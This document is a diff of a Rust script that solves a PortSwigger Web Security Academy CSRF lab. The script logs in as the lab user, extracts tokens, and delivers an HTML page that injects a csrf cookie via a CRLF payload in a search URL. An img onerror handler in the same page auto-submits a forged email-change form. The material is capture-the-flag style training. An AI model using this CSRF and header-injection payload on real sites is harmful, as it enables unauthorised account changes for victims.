@@ -4,15 +4,15 @@
 *
 * Date: 21/10/2023
 *
-* Lab: CSRF where token is tied to non-session cookie
+* Lab: CSRF where token is duplicated in cookie
 *
 * Steps: 1. Fetch the login page
-*        2. Extract csrf token, session cookie and csrf key cookie
+*        2. Extract csrf token and session cookie
 *        3. Login as wiener
 *        4. Fetch wiener profile
 *        5. Extract the csrf token that is needed for email update
 *        6. Craft an HTML form for changing the email address that includes
-*           the extracted csrf token and an img tag which is used to set the csrfKey
+*           the extracted csrf token and an img tag which is used to set the csrf
 *           cookie via its src and submit the form via its error handler
 *        7. Deliver the exploit to the victim
 *        8. The victim's email will be changed after he trigger the exploit
@@ -41,10 +41,10 @@ use text_colorizer::Colorize;
 *******************/
 fn main() {
     // change this to your lab URL
-    let lab_url = "https://0ae4003104d4c51d806e303700380006.web-security-academy.net";
+    let lab_url = "https://0a1e000b038f680d805bfe23009900b2.web-security-academy.net";
 
     // change this to your exploit server URL
-    let exploit_server_url = "https://exploit-0ae0006c04dcc52a80022f5e01eb0010.exploit-server.net";
+    let exploit_server_url = "https://exploit-0a08004d032068c0807afd4501240053.exploit-server.net";
 
     // build the client that will be used for all subsequent requests
     let client = build_client();
@@ -64,20 +64,16 @@ fn main() {
     println!("{}", "OK".green());
     print!(
         "{}",
-        "⦗2⦘ Extracting csrf token, session cookie and csrf key cookie.. ".white(),
+        "⦗2⦘ Extracting csrf token and session cookie.. ".white(),
     );
     io::stdout().flush();
 
     // extract session cookie
-    let mut session = extract_from_multiple_cookies(&login_page.headers().clone(), "cookie")
+    let mut session = extract_session_multiple_cookies(login_page.headers())
         .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
 
-    // extract csrfKey cookie
-    let mut csrf_key = extract_from_multiple_cookies(login_page.headers(), "csrfKey")
-        .expect(&format!("{}", "[!] Failed to extract csrfKey cookie".red()));
-
     // extract csrf token to login
-    let mut csrf_token = extract_csrf(login_page)
+    let mut csrf = extract_csrf(login_page)
         .expect(&format!("{}", "[!] Failed to extract csrf to login".red()));
 
     println!("{}", "OK".green());
@@ -87,11 +83,11 @@ fn main() {
     // login as wiener
     let login = client
         .post(format!("{lab_url}/login"))
-        .header("Cookie", format!("session={session}; csrfKey={csrf_key}"))
+        .header("Cookie", format!("session={session}; csrf={csrf}"))
         .form(&HashMap::from([
             ("username", "wiener"),
             ("password", "peter"),
-            ("csrf", &csrf_token),
+            ("csrf", &csrf),
         ]))
         .send()
         .expect(&format!("{}", "[!] Failed to login as wiener".red()));
@@ -118,12 +114,8 @@ fn main() {
     );
     io::stdout().flush();
 
-    // extract csrfKey cookie
-    csrf_key = extract_from_multiple_cookies(wiener.headers(), "csrfKey")
-        .expect(&format!("{}", "[!] Failed to extract csrfKey cookie".red()));
-
     // extract the csrf token that is needed for email update
-    csrf_token = extract_csrf(wiener).expect(&format!(
+    csrf = extract_csrf(wiener).expect(&format!(
         "{}",
         "[!] Failed to extract csrf token that is needed for email update".red()
     ));
@@ -138,10 +130,10 @@ fn main() {
                 <body>
                 <form action="{lab_url}/my-account/change-email" method="POST">
                     <input type="hidden" name="email" value="{new_email}" />
-                    <input type="hidden" name="csrf" value="{csrf_token}" />
+                    <input type="hidden" name="csrf" value="{csrf}" />
                     <input type="submit" value="Submit request" />
                 </form>
-                <img src="{lab_url}/?search=boo%0d%0aSet-Cookie: csrfKey={csrf_key}; SameSite=None" onerror=document.forms[0].submit()>
+                <img src="{lab_url}/?search=boo%0d%0aSet-Cookie: csrf={csrf}; SameSite=None" onerror=document.forms[0].submit()>
                 </body>
             </html>
       "###
@@ -236,32 +228,17 @@ fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
 /**********************************************************
 * Function to extract session field from multiple cookies
 ***********************************************************/
-fn extract_from_multiple_cookies(headers: &HeaderMap, cookie_name: &str) -> Option<String> {
-    let mut cookie: Option<_> = None;
-
-    match cookie_name {
-        "cookie" => cookie = headers.get_all("set-cookie").iter().nth(1),
-        "csrfKey" => cookie = headers.get_all("set-cookie").iter().nth(0),
-        _ => (),
-    }
-
-    let text = cookie.unwrap().to_str().unwrap();
-
-    match cookie_name {
-        "cookie" => {
-            if let Some(session) = capture_pattern("session=(.*); Secure", text) {
-                Some(session.as_str().to_string())
-            } else {
-                None
-            }
-        }
-        "csrfKey" => {
-            if let Some(token) = capture_pattern("csrfKey=(.*); Secure", text) {
-                Some(token.as_str().to_string())
-            } else {
-                None
-            }
-        }
-        _ => None,
+fn extract_session_multiple_cookies(headers: &HeaderMap) -> Option<String> {
+    let cookie = headers
+        .get_all("set-cookie")
+        .iter()
+        .nth(1)
+        .unwrap()
+        .to_str()
+        .unwrap();
+    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
+        Some(session.as_str().to_string())
+    } else {
+        None
     }
 }
